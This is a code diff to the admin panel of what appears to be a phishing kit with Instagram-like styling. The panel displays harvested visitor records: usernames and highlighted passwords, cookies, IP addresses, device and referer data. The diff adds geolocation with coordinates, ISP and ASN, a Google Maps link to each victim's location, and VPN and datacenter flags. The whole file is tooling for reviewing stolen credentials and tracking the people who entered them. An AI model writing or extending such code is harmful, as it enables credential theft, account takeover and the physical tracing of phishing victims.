@@ -8,6 +8,7 @@
 * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
 body { background:#0a0a0a; color:#fff; min-height:100vh; }
 
+/* Login */
 .login-box { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
 .login-card { background:#121212; border:1px solid #262626; border-radius:12px; padding:32px; width:100%; max-width:360px; }
 .login-card h1 { font-size:22px; margin-bottom:24px; text-align:center; }
@@ -17,6 +18,7 @@ body { background:#0a0a0a; color:#fff; min-height:100vh; }
 .login-card button:hover { background:#1877f2; }
 .error { color:#ff4444; font-size:13px; margin-bottom:12px; text-align:center; }
 
+/* Panel */
 .panel { display:none; padding:20px; max-width:900px; margin:0 auto; }
 .panel.active { display:block; }
 .panel-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; padding-bottom:14px; border-bottom:1px solid #262626; }
@@ -31,17 +33,34 @@ body { background:#0a0a0a; color:#fff; min-height:100vh; }
 .refresh-btn:hover { background:#1877f2; }
 .loading { text-align:center; padding:40px; color:#888; }
 .empty { text-align:center; padding:40px; color:#888; font-size:14px; }
-.visit { background:#121212; border:1px solid #262626; border-radius:10px; padding:14px; margin-bottom:10px; }
-.visit-top { display:flex; justify-content:space-between; margin-bottom:8px; }
+
+/* Visit Card */
+.visit { background:#121212; border:1px solid #262626; border-radius:10px; padding:14px; margin-bottom:12px; }
+.visit-top { display:flex; justify-content:space-between; margin-bottom:10px; padding-bottom:10px; border-bottom:1px solid #1f1f1f; }
 .visit-time { font-size:11px; color:#888; }
 .visit-num { font-size:11px; color:#0095f6; font-weight:600; }
-.visit-row { font-size:13px; margin-bottom:6px; display:flex; gap:8px; }
-.visit-row .label { color:#888; min-width:70px; }
-.visit-row .value { color:#fff; word-break:break-all; }
+.visit-row { font-size:13px; margin-bottom:7px; display:flex; gap:8px; align-items:flex-start; }
+.visit-row .label { color:#888; min-width:80px; flex-shrink:0; }
+.visit-row .value { color:#fff; word-break:break-all; flex:1; }
 .visit-row .value.user { color:#ffd700; font-weight:600; }
 .visit-row .value.pass { color:#ff6b6b; font-weight:600; }
-.visit-row .value.ip { color:#4ade80; }
+.visit-row .value.ip { color:#4ade80; font-family:monospace; }
 .visit-row .value.ua { font-size:11px; color:#aaa; }
+
+/* Location block */
+.location-block { background:#0f1a2e; border:1px solid #1e3a5f; border-radius:8px; padding:12px; margin:10px 0; }
+.location-block .loc-title { font-size:11px; color:#60a5fa; font-weight:600; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px; }
+.location-block .loc-row { font-size:13px; color:#e0e0e0; margin-bottom:4px; }
+.location-block .loc-coords { font-family:monospace; color:#4ade80; font-size:12px; }
+.maps-btn { display:inline-block; margin-top:8px; padding:8px 14px; background:#0095f6; border:none; border-radius:6px; color:#fff; font-size:12px; font-weight:600; text-decoration:none; cursor:pointer; }
+.maps-btn:hover { background:#1877f2; }
+
+/* Badges */
+.badges { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; }
+.badge { padding:3px 8px; border-radius:4px; font-size:10px; font-weight:600; text-transform:uppercase; letter-spacing:0.3px; }
+.badge.proxy { background:#7c2d12; color:#fed7aa; }
+.badge.hosting { background:#713f12; color:#fef08a; }
+.badge.mobile { background:#14532d; color:#bbf7d0; }
 </style>
 </head>
 <body>
@@ -148,22 +167,51 @@ function renderData(visits) {
     document.getElementById('statToday').textContent = todayCount;
     document.getElementById('statUnique').textContent = uniqueIPs;
 
-    container.innerHTML = visits.map((v, i) => `
-        <div class="visit">
-            <div class="visit-top">
-                <span class="visit-num">#${visits.length - i}</span>
-                <span class="visit-time">${v.timestamp || '-'}</span>
+    container.innerHTML = visits.map((v, i) => {
+        const geo = v.geo || null;
+        const mapsUrl = geo && geo.lat && geo.lon
+            ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}`
+            : '';
+
+        let geoBlock = '';
+        if (geo) {
+            const badges = [];
+            if (geo.isProxy)   badges.push('<span class="badge proxy">VPN/Proxy</span>');
+            if (geo.isHosting) badges.push('<span class="badge hosting">Datacenter</span>');
+            if (geo.isMobile)  badges.push('<span class="badge mobile">Mobile</span>');
+
+            geoBlock = `
+                <div class="location-block">
+                    <div class="loc-title">📍 Lokasi</div>
+                    <div class="loc-row">${geo.city || '-'}, ${geo.region || '-'}, ${geo.country || '-'}</div>
+                    <div class="loc-row">ISP: ${geo.isp || '-'}</div>
+                    ${geo.org ? `<div class="loc-row">Org: ${geo.org}</div>` : ''}
+                    ${geo.asn ? `<div class="loc-row">ASN: ${geo.asn}</div>` : ''}
+                    ${geo.lat && geo.lon ? `<div class="loc-row loc-coords">${geo.lat}, ${geo.lon}</div>` : ''}
+                    ${badges.length ? `<div class="badges">${badges.join('')}</div>` : ''}
+                    ${mapsUrl ? `<a class="maps-btn" href="${mapsUrl}" target="_blank" rel="noopener">Open in Google Maps</a>` : ''}
+                </div>
+            `;
+        }
+
+        return `
+            <div class="visit">
+                <div class="visit-top">
+                    <span class="visit-num">#${visits.length - i}</span>
+                    <span class="visit-time">${v.timestamp || '-'}</span>
+                </div>
+                ${v.username ? `<div class="visit-row"><span class="label">Username</span><span class="value user">${escapeHtml(v.username)}</span></div>` : ''}
+                ${v.password ? `<div class="visit-row"><span class="label">Password</span><span class="value pass">${escapeHtml(v.password)}</span></div>` : ''}
+                <div class="visit-row"><span class="label">IP</span><span class="value ip">${v.ip || '-'}</span></div>
+                ${geoBlock}
+                <div class="visit-row"><span class="label">Device</span><span class="value ua">${(v.user_agent || '-').substring(0, 90)}</span></div>
+                <div class="visit-row"><span class="label">Referer</span><span class="value">${v.referer || '-'}</span></div>
+                ${v.screen ? `<div class="visit-row"><span class="label">Screen</span><span class="value">${v.screen}</span></div>` : ''}
+                ${v.timezone ? `<div class="visit-row"><span class="label">Timezone</span><span class="value">${v.timezone}</span></div>` : ''}
+                ${v.cookies ? `<div class="visit-row"><span class="label">Cookies</span><span class="value">${escapeHtml(v.cookies)}</span></div>` : ''}
             </div>
-            ${v.username ? `<div class="visit-row"><span class="label">Username</span><span class="value user">${escapeHtml(v.username)}</span></div>` : ''}
-            ${v.password ? `<div class="visit-row"><span class="label">Password</span><span class="value pass">${escapeHtml(v.password)}</span></div>` : ''}
-            <div class="visit-row"><span class="label">IP</span><span class="value ip">${v.ip || '-'}</span></div>
-            <div class="visit-row"><span class="label">Location</span><span class="value">${v.city || '-'}, ${v.country || '-'}</span></div>
-            <div class="visit-row"><span class="label">Device</span><span class="value ua">${(v.user_agent || '-').substring(0, 80)}</span></div>
-            <div class="visit-row"><span class="label">Referer</span><span class="value">${v.referer || '-'}</span></div>
-            ${v.screen ? `<div class="visit-row"><span class="label">Screen</span><span class="value">${v.screen}</span></div>` : ''}
-            ${v.timezone ? `<div class="visit-row"><span class="label">Timezone</span><span class="value">${v.timezone}</span></div>` : ''}
-        </div>
-    `).join('');
+        `;
+    }).join('');
 }
 
 function escapeHtml(s) {
